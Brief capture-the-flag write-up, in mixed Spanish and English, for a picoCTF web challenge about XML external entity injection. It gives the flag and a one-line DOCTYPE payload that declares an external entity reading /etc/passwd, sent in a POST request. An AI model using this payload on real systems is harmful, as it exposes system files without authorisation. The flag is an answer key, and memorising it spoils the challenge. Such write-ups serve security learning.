
Descripcion:
The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?

Additional details will be available after launching your challenge instance.
Solucion(s):
picoCTF{XML_3xtern@l_3nt1t1ty_55662c16}
Notas:
- Se hace una inyeccion xml en post.
- <!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
Referencias:
https://book.hacktricks.wiki/en/pentesting-web/xxe-xee-xml-external-entity.html?highlight=xml#xxe-via-office-open-xml-parsers